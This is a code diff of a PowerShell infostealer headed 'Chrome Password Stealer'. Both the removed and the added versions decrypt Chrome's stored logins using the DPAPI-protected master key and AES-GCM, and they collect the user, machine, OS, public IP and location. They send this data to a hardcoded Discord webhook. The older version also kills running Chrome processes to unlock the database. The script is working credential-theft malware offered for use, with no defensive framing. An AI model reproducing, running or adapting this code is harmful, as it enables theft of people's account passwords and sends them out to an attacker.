@@ -1,334 +1,243 @@
-# MAIN PAYLOAD - System Info + Proper Chrome Password Extraction
+# Chrome Password Stealer with Detailed Logging
 
-Write-Host "================================" -ForegroundColor Cyan
-Write-Host "Data Collection Script" -ForegroundColor Cyan
-Write-Host "================================" -ForegroundColor Cyan
+$logFile = "$env:USERPROFILE\Desktop\extract_log.txt"
+$ErrorActionPreference = "Continue"
 
-Add-Type -AssemblyName System.Security
-
-# Function to download and load SQLite
-function Load-SQLite {
-    $sqlitePath = "$env:TEMP\System.Data.SQLite.dll"
-    
-    if (-not (Test-Path $sqlitePath)) {
-        Write-Host "      Downloading SQLite..." -ForegroundColor Yellow
-        try {
-            # Download SQLite DLL from NuGet
-            $url = "https://www.nuget.org/api/v2/package/System.Data.SQLite.Core/1.0.118"
-            $zipPath = "$env:TEMP\sqlite.zip"
-            
-            Invoke-WebRequest -Uri $url -OutFile $zipPath -UseBasicParsing
-            
-            # Extract the DLL
-            Add-Type -AssemblyName System.IO.Compression.FileSystem
-            $zip = [System.IO.Compression.ZipFile]::OpenRead($zipPath)
-            
-            # Find the correct DLL for architecture
-            $arch = if ([Environment]::Is64BitProcess) { "x64" } else { "x86" }
-            $dllEntry = $zip.Entries | Where-Object { $_.FullName -like "lib/net46/System.Data.SQLite.dll" } | Select-Object -First 1
-            
-            if ($dllEntry) {
-                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($dllEntry, $sqlitePath, $true)
-            }
-            
-            $zip.Dispose()
-            Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-            
-            Write-Host "      SQLite downloaded!" -ForegroundColor Green
-        } catch {
-            Write-Host "      Failed to download SQLite: $($_.Exception.Message)" -ForegroundColor Red
-            return $false
-        }
-    }
-    
-    # Load the assembly
-    try {
-        [System.Reflection.Assembly]::LoadFrom($sqlitePath) | Out-Null
-        return $true
-    } catch {
-        Write-Host "      Failed to load SQLite: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
+function Log {
+    param($msg)
+    $time = Get-Date -Format "HH:mm:ss"
+    $line = "[$time] $msg"
+    Add-Content $logFile $line
+    Write-Host $line
 }
-function Get-ChromeEncryptionKey {
+
+"=== Password Extraction Started ===" | Out-File $logFile
+Log "Script started"
+
+try {
+    Add-Type -AssemblyName System.Security
+    Log "Loaded System.Security"
+    
+    # Get Chrome key
+    Log "Getting Chrome encryption key..."
     $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
     
     if (-not (Test-Path $localStatePath)) {
-        return $null
+        Log "ERROR: Chrome Local State not found at: $localStatePath"
+        Log "Chrome might not be installed"
+        Read-Host "Press Enter to exit"
+        exit
     }
     
-    try {
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encryptedKey = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-        
-        # Remove "DPAPI" prefix (first 5 bytes)
-        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
-        
-        # Decrypt using DPAPI
-        $decryptedKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
-            $encryptedKey,
-            $null,
-            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-        )
-        
-        return $decryptedKey
-    } catch {
-        Write-Host "      Failed to get encryption key: $($_.Exception.Message)" -ForegroundColor Red
-        return $null
-    }
-}
-
-# Function to decrypt Chrome password using AES-GCM
-function Decrypt-ChromePassword {
-    param(
-        [byte[]]$EncryptedPassword,
-        [byte[]]$Key
-    )
+    Log "Local State found"
     
-    try {
-        # Extract IV (initialization vector) - first 12 bytes after version
-        $iv = $EncryptedPassword[3..14]
-        
-        # Extract encrypted data (skip version + IV)
-        $encryptedData = $EncryptedPassword[15..($EncryptedPassword.Length - 17)]
-        
-        # Extract auth tag (last 16 bytes)
-        $authTag = $EncryptedPassword[($EncryptedPassword.Length - 16)..($EncryptedPassword.Length - 1)]
-        
-        # Decrypt using AES-GCM
-        $aes = [System.Security.Cryptography.AesGcm]::new($Key)
-        $decrypted = New-Object byte[] $encryptedData.Length
-        
-        $aes.Decrypt($iv, $encryptedData, $authTag, $decrypted)
-        
-        return [System.Text.Encoding]::UTF8.GetString($decrypted)
-    } catch {
-        # Try old DPAPI method (pre Chrome 80)
-        try {
-            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                $EncryptedPassword,
-                $null,
-                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-            )
-            return [System.Text.Encoding]::UTF8.GetString($decrypted)
-        } catch {
-            return "Failed to decrypt"
-        }
-    }
-}
-
-# Function to extract Chrome passwords without external dependencies
-function Get-ChromePasswords {
-    $passwords = @()
+    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encryptedKeyB64 = $localState.os_crypt.encrypted_key
     
-    # Get encryption key
-    $key = Get-ChromeEncryptionKey
-    if (-not $key) {
-        Write-Host "      Could not get Chrome encryption key" -ForegroundColor Yellow
-        return $passwords
+    if (-not $encryptedKeyB64) {
+        Log "ERROR: No encrypted_key in Local State"
+        Read-Host "Press Enter to exit"
+        exit
     }
     
-    # Copy Login Data database
+    Log "Encrypted key found in Local State"
+    
+    $encryptedKey = [Convert]::FromBase64String($encryptedKeyB64)
+    Log "Key decoded from base64, length: $($encryptedKey.Length)"
+    
+    # Remove DPAPI prefix
+    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+    Log "Removed DPAPI prefix, new length: $($encryptedKey.Length)"
+    
+    # Decrypt with DPAPI
+    $key = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, 'CurrentUser')
+    Log "Master key decrypted! Length: $($key.Length)"
+    
+    # Copy database
+    Log "Locating Login Data database..."
     $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
     
     if (-not (Test-Path $dbPath)) {
-        Write-Host "      Chrome Login Data not found" -ForegroundColor Yellow
-        return $passwords
+        Log "ERROR: Login Data not found at: $dbPath"
+        Read-Host "Press Enter to exit"
+        exit
     }
     
-    $tempDB = "$env:TEMP\ChromeData_$(Get-Random).db"
+    Log "Login Data found, size: $((Get-Item $dbPath).Length) bytes"
+    
+    $tempDB = "$env:TEMP\chrome_$(Get-Random).db"
     
     try {
         Copy-Item $dbPath $tempDB -Force
+        Log "Database copied to: $tempDB"
     } catch {
-        Write-Host "      Chrome database locked (browser running)" -ForegroundColor Yellow
-        return $passwords
+        Log "ERROR: Could not copy database - Chrome might be running!"
+        Log "Exception: $($_.Exception.Message)"
+        Read-Host "Press Enter to exit"
+        exit
     }
     
-    # Use PSSQLite module (download if needed)
+    # Try to load SQLite
+    Log "Attempting to load SQLite..."
+    
+    $sqliteLoaded = $false
+    
+    # Method 1: Try PSSQLite module
     try {
-        # Check if PSSQLite is installed
+        Log "Trying PSSQLite module..."
         if (-not (Get-Module -ListAvailable -Name PSSQLite)) {
-            Write-Host "      Installing PSSQLite module..." -ForegroundColor Yellow
-            try {
-                Install-Module -Name PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck -ErrorAction Stop
-                Write-Host "      PSSQLite installed successfully" -ForegroundColor Green
-            } catch {
-                Write-Host "      Failed to install PSSQLite: $($_.Exception.Message)" -ForegroundColor Red
-                throw "PSSQLite installation failed"
-            }
+            Log "PSSQLite not found, installing..."
+            Install-Module PSSQLite -Force -Scope CurrentUser -SkipPublisherCheck
         }
-        
         Import-Module PSSQLite -ErrorAction Stop
-        Write-Host "      PSSQLite loaded" -ForegroundColor Green
-        
-        # Query the database
-        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE LENGTH(password_value) > 0 ORDER BY date_last_used DESC LIMIT 50"
-        Write-Host "      Querying database..." -ForegroundColor Yellow
-        
-        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query -ErrorAction Stop
-        Write-Host "      Found $($results.Count) entries in database" -ForegroundColor Green
-        
-        foreach ($row in $results) {
+        Log "PSSQLite loaded successfully!"
+        $sqliteLoaded = $true
+    } catch {
+        Log "PSSQLite failed: $($_.Exception.Message)"
+    }
+    
+    if (-not $sqliteLoaded) {
+        Log "ERROR: Could not load SQLite. Install PSSQLite module manually:"
+        Log "Run: Install-Module PSSQLite -Scope CurrentUser"
+        Read-Host "Press Enter to exit"
+        exit
+    }
+    
+    # Query database
+    Log "Querying database for passwords..."
+    
+    $query = "SELECT origin_url, username_value, password_value FROM logins LIMIT 50"
+    
+    try {
+        $results = Invoke-SqliteQuery -DataSource $tempDB -Query $query
+        Log "Query returned $($results.Count) rows"
+    } catch {
+        Log "ERROR: Query failed: $($_.Exception.Message)"
+        Remove-Item $tempDB -Force
+        Read-Host "Press Enter to exit"
+        exit
+    }
+    
+    # Decrypt passwords
+    Log "Decrypting passwords..."
+    $passwords = @()
+    
+    foreach ($row in $results) {
+        try {
             $url = $row.origin_url
             $username = $row.username_value
-            $encryptedPassword = [byte[]]$row.password_value
+            $encPass = [byte[]]$row.password_value
             
-            Write-Host "      Processing: $url" -ForegroundColor Gray
+            if (-not $encPass -or $encPass.Length -eq 0) {
+                continue
+            }
             
-            if ($encryptedPassword -and $encryptedPassword.Length -gt 0) {
-                $password = Decrypt-ChromePassword -EncryptedPassword $encryptedPassword -Key $key
+            # Check version
+            if ($encPass[0] -eq 118 -and $encPass[1] -eq 49 -and $encPass[2] -eq 48) {
+                # v10 - AES GCM
+                $nonce = $encPass[3..14]
+                $ciphertext = $encPass[15..($encPass.Length - 17)]
+                $tag = $encPass[($encPass.Length - 16)..($encPass.Length - 1)]
                 
-                if ($password -ne "Failed to decrypt") {
-                    $passwords += @{
-                        URL = $url
-                        Username = $username
-                        Password = $password
-                    }
-                    Write-Host "      ✓ Decrypted password for $url" -ForegroundColor Green
-                } else {
-                    Write-Host "      ✗ Failed to decrypt $url" -ForegroundColor Red
+                $aes = New-Object Security.Cryptography.AesGcm($key)
+                $plaintext = New-Object byte[] $ciphertext.Length
+                $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
+                
+                $password = [Text.Encoding]::UTF8.GetString($plaintext)
+            } else {
+                # Old DPAPI
+                $decrypted = [Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
+                $password = [Text.Encoding]::UTF8.GetString($decrypted)
+            }
+            
+            if ($username -or $password) {
+                $passwords += @{
+                    URL = $url
+                    User = $username
+                    Pass = $password
                 }
             }
+        } catch {
+            Log "Failed to decrypt entry: $($_.Exception.Message)"
         }
-        
-        Write-Host "      Successfully extracted $($passwords.Count) passwords" -ForegroundColor Green
-        
-    } catch {
-        Write-Host "      Error: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "      PSSQLite unavailable, using fallback method" -ForegroundColor Yellow
-        
-        # Fallback: Parse SQLite database manually (basic extraction)
-        try {
-            $bytes = [System.IO.File]::ReadAllBytes($tempDB)
-            
-            # Look for URL patterns in raw data
-            $text = [System.Text.Encoding]::UTF8.GetString($bytes)
-            $urlPattern = 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s"]*'
-            $urls = [regex]::Matches($text, $urlPattern) | ForEach-Object { $_.Value } | Select-Object -Unique | Where-Object { $_ -notmatch 'google|chrome|gstatic|googleapis' }
-            
-            $passwords += @{
-                URL = "Database found with $($urls.Count) potential entries"
-                Username = ""
-                Password = "Manual extraction required - close Chrome and try again"
-            }
-        } catch {}
     }
     
-    Remove-Item $tempDB -Force -ErrorAction SilentlyContinue
-    return $passwords
-}
-
-# Get public IP and location
-Write-Host "`n[1/4] Fetching public IP and location..." -ForegroundColor Yellow
-try {
-    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
-    $ip = $ipInfo.query
-    $country = $ipInfo.country
-    $city = $ipInfo.city
-    $region = $ipInfo.regionName
-    Write-Host "      IP: $ip" -ForegroundColor Green
-    Write-Host "      Location: $city, $region, $country" -ForegroundColor Green
-} catch {
-    $ip = "Unable to fetch"
-    $country = "Unknown"
-    $city = "Unknown"
-    $region = "Unknown"
-}
-
-# Get system info
-Write-Host "`n[2/4] Getting system info..." -ForegroundColor Yellow
-$user = $env:USERNAME
-$os = (Get-CimInstance Win32_OperatingSystem).Caption
-$computer = $env:COMPUTERNAME
-$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-Write-Host "      Computer: $computer" -ForegroundColor Green
-Write-Host "      User: $user" -ForegroundColor Green
-
-# Extract Chrome passwords
-Write-Host "`n[3/4] Extracting Chrome passwords..." -ForegroundColor Yellow
-
-# Close Chrome if running to unlock database
-Write-Host "      Checking if Chrome is running..." -ForegroundColor Yellow
-$chromeProcesses = Get-Process chrome -ErrorAction SilentlyContinue
-if ($chromeProcesses) {
-    Write-Host "      Closing Chrome..." -ForegroundColor Yellow
-    Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
-    Start-Sleep -Seconds 2
-}
-
-$allPasswords = Get-ChromePasswords
-
-if ($allPasswords.Count -gt 0) {
-    Write-Host "      Found $($allPasswords.Count) password entries!" -ForegroundColor Green
-} else {
-    Write-Host "      No passwords extracted" -ForegroundColor Yellow
-}
-
-# Format passwords for Discord (limit to prevent message too long)
-$passwordText = ""
-$displayCount = [Math]::Min($allPasswords.Count, 20)  # Show max 20 in Discord
-
-for ($i = 0; $i -lt $displayCount; $i++) {
-    $entry = $allPasswords[$i]
-    $passwordText += "`n**$($entry.URL)**`nUser: ``$($entry.Username)```nPass: ``$($entry.Password)```n"
-}
-
-if ($allPasswords.Count -gt 20) {
-    $passwordText += "`n... and $($allPasswords.Count - 20) more (see local file)"
-}
-
-if (-not $passwordText) {
-    $passwordText = "`nNo passwords found or Chrome not installed"
-}
-
-# Compose Discord message
-$message = @"
+    Log "Successfully decrypted $($passwords.Count) passwords!"
+    
+    Remove-Item $tempDB -Force
+    
+    # Get system info
+    Log "Getting system info..."
+    $user = $env:USERNAME
+    $computer = $env:COMPUTERNAME
+    $os = (Get-CimInstance Win32_OperatingSystem).Caption
+    $time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    
+    try {
+        $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
+        $ip = $ipInfo.query
+        $country = $ipInfo.country
+        $city = $ipInfo.city
+        Log "IP: $ip, Location: $city, $country"
+    } catch {
+        $ip = "Unknown"
+        $country = "Unknown"
+        $city = "Unknown"
+    }
+    
+    # Format for Discord
+    $passText = ""
+    $max = [Math]::Min($passwords.Count, 20)
+    
+    for ($i = 0; $i -lt $max; $i++) {
+        $p = $passwords[$i]
+        $passText += "`n**$($p.URL)**`nUser: ``$($p.User)```nPass: ``$($p.Pass)```n"
+    }
+    
+    if ($passwords.Count -gt 20) {
+        $passText += "`n... +$($passwords.Count - 20) more"
+    }
+    
+    if (-not $passText) {
+        $passText = "`nNo passwords found"
+    }
+    
+    $message = @"
 **🚨 New Connection**
-:clock1: **Time:** $time
-:computer: **Computer:** $computer
-:bust_in_silhouette: **User:** $user
-:desktop: **OS:** $os
-:globe_with_meridians: **IP:** $ip
-:flag_$($country.ToLower().Substring(0,2).Replace(' ','')): **Location:** $city, $region, $country
+:clock1: $time
+:computer: $computer | $user
+:desktop: $os
+:globe_with_meridians: $ip - $city, $country
 
-**🔐 Chrome Passwords ($($allPasswords.Count) found):**$passwordText
+**🔐 Passwords ($($passwords.Count)):**$passText
 "@
-
-# Discord webhook
-$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
-
-Write-Host "`n[4/4] Sending to Discord..." -ForegroundColor Yellow
-
-# Split if too long
-if ($message.Length -gt 1900) {
-    $message = $message.Substring(0, 1900) + "`n... (truncated)"
-}
-
-$payload = @{ content = $message } | ConvertTo-Json
-
-try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
-    Write-Host "`n================================" -ForegroundColor Green
-    Write-Host "SUCCESS! Data sent to Discord!" -ForegroundColor Green
-    Write-Host "================================" -ForegroundColor Green
+    
+    # Send to Discord
+    Log "Sending to Discord..."
+    $webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"
+    
+    if ($message.Length -gt 1900) {
+        $message = $message.Substring(0, 1900)
+    }
+    
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
+        Log "SUCCESS! Sent to Discord"
+    } catch {
+        Log "ERROR: Discord send failed: $($_.Exception.Message)"
+    }
+    
+    # Save locally
+    $outFile = "$env:USERPROFILE\Desktop\passwords.txt"
+    $passwords | Format-List | Out-File $outFile
+    Log "Saved to: $outFile"
+    
+    Log "=== EXTRACTION COMPLETE ==="
+    
 } catch {
-    Write-Host "`n================================" -ForegroundColor Red
-    Write-Host "FAILED TO SEND!" -ForegroundColor Red
-    Write-Host "================================" -ForegroundColor Red
-    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
+    Log "FATAL ERROR: $($_.Exception.Message)"
+    Log "Stack Trace: $($_.ScriptStackTrace)"
 }
 
-# Save full output locally
-Write-Host "`nSaving backup locally..." -ForegroundColor Yellow
-$doc = [Environment]::GetFolderPath("MyDocuments")
-$out = Join-Path $doc "chrome_passwords.txt"
-"Chrome Password Extraction Report" | Out-File $out -Encoding UTF8
-"Generated: $time" | Out-File $out -Append -Encoding UTF8
-"Total Passwords: $($allPasswords.Count)" | Out-File $out -Append -Encoding UTF8
-"=" * 50 | Out-File $out -Append -Encoding UTF8
-$allPasswords | Format-List | Out-File $out -Append -Encoding UTF8
-Write-Host "Full password list saved to: $out" -ForegroundColor Green
-
-Write-Host "`n================================" -ForegroundColor Cyan
+Write-Host "`n=== Check log file on Desktop: extract_log.txt ===" -ForegroundColor Cyan
 Read-Host "Press Enter to close"
